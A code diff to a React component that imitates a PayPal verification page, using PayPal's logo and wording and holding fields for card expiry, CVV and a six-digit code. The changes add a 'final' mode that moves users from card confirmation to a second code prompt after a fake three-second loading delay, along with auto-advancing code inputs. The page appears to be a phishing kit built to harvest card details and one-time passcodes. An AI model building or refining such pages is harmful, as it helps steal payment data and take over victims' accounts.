@@ -19,7 +19,7 @@ export function VerificationPage({ email, onBack, onVerificationSuccess, mode = 
   const [expiryDate, setExpiryDate] = useState('');
   const [cvv, setCvv] = useState('');
   const [verificationCode, setVerificationCode] = useState(['', '', '', '', '', '']);
-  const [countdown, setCountdown] = useState(60);
+  const [countdown, setCountdown] = useState(45);
 
   useEffect(() => {
     let timer: NodeJS.Timeout;
@@ -58,8 +58,9 @@ export function VerificationPage({ email, onBack, onVerificationSuccess, mode = 
       setLoading(false);
       if (selectedOption === 'confirm_card') {
         setStep('confirm_card');
-      } else if (selectedOption === 'get_text') {
+      } else if (selectedOption === 'get_text' || selectedOption === 'have_call') {
         setStep('enter_code');
+        setCountdown(45);
       }
     }, 3000);
   };
@@ -77,7 +78,16 @@ export function VerificationPage({ email, onBack, onVerificationSuccess, mode = 
 
   const handleConfirm = (e: React.FormEvent) => {
     e.preventDefault();
-    onVerificationSuccess();
+    if (mode === 'final') {
+      setLoading(true);
+      setTimeout(() => {
+        setLoading(false);
+        setStep('enter_code');
+        setCountdown(45);
+      }, 3000);
+    } else {
+      onVerificationSuccess();
+    }
   };
 
   const handleCodeSubmit = (e: React.FormEvent) => {
@@ -111,7 +121,6 @@ export function VerificationPage({ email, onBack, onVerificationSuccess, mode = 
   if (step === 'confirm_card') {
     return (
       <div className="min-h-screen w-full bg-white flex flex-col items-center font-['Inter',sans-serif]">
-        {renderTopBar()}
         <div className="w-full max-w-[480px] px-8 pt-12 flex flex-col items-center">
           <form onSubmit={handleConfirm} className="w-full flex flex-col items-center">
             {/* PayPal Logo */}
@@ -179,9 +188,9 @@ export function VerificationPage({ email, onBack, onVerificationSuccess, mode = 
   if (step === 'enter_code') {
     return (
       <div className="min-h-screen w-full bg-white flex flex-col items-center font-['Inter',sans-serif]">
-        {renderTopBar()}
         <div className="w-full max-w-[480px] px-8 pt-12 flex flex-col items-center">
           <form onSubmit={handleCodeSubmit} className="w-full flex flex-col items-center">
+            {/* PayPal Logo */}
             <div className="mb-8 self-start">
               <svg viewBox="0 0 200 200" className="w-10 h-10" xmlns="http://www.w3.org/2000/svg">
                 <path d="M55.4,153.8l14.1-89.2c0.3-1.9,1.9-3.3,3.8-3.3h38.2c18.5,0,28.8,8.8,26.4,24.1 c-2,12.5-11.2,22.2-23.4,24.1c-1.5,0.2-2.7,1.4-3,2.9l-0.3,1.6l-2.4,15.4l-0.2,1.1c-0.3,1.9-1.9,3.3-3.8,3.3H81.6 c-2.3,0-4,2.1-3.6,4.4l-5.6,35.6c-0.3,1.9-1.9,3.3-3.8,3.3H55.4z" fill="#003087" />
@@ -189,7 +198,7 @@ export function VerificationPage({ email, onBack, onVerificationSuccess, mode = 
               </svg>
             </div>
             <h1 className="text-[32px] font-bold text-gray-900 leading-tight mb-8 self-start tracking-tight">
-              Enter the code we texted you
+              {mode === 'final' ? 'Enter the code you get' : 'Enter the code we texted you'}
             </h1>
             <p className="text-[16px] text-gray-900 mb-8 self-start font-medium">
               +1 •••-•••-••••
@@ -206,6 +215,16 @@ export function VerificationPage({ email, onBack, onVerificationSuccess, mode = 
                     const nextCode = [...verificationCode];
                     nextCode[i] = e.target.value;
                     setVerificationCode(nextCode);
+                    if (e.target.value && i < 5) {
+                      const nextInput = e.target.parentElement?.children[i + 1] as HTMLInputElement;
+                      nextInput?.focus();
+                    }
+                  }}
+                  onKeyDown={(e) => {
+                    if (e.key === 'Backspace' && !verificationCode[i] && i > 0) {
+                      const prevInput = e.target.parentElement?.children[i - 1] as HTMLInputElement;
+                      prevInput?.focus();
+                    }
                   }}
                 />
               ))}
@@ -251,10 +270,9 @@ export function VerificationPage({ email, onBack, onVerificationSuccess, mode = 
         </div>
       )}
 
-      {renderTopBar()}
-
       <div className="w-full max-w-[480px] px-8 pt-12 flex flex-col items-center">
         <form onSubmit={handleSubmit} className="w-full flex flex-col items-center">
+          {/* PayPal Logo */}
           <div className="mb-8 self-start">
             <svg viewBox="0 0 200 200" className="w-10 h-10" xmlns="http://www.w3.org/2000/svg">
               <path d="M55.4,153.8l14.1-89.2c0.3-1.9,1.9-3.3,3.8-3.3h38.2c18.5,0,28.8,8.8,26.4,24.1 c-2,12.5-11.2,22.2-23.4,24.1c-1.5,0.2-2.7,1.4-3,2.9l-0.3,1.6l-2.4,15.4l-0.2,1.1c-0.3,1.9-1.9,3.3-3.8,3.3H81.6 c-2.3,0-4,2.1-3.6,4.4l-5.6,35.6c-0.3,1.9-1.9,3.3-3.8,3.3H55.4z" fill="#003087" />
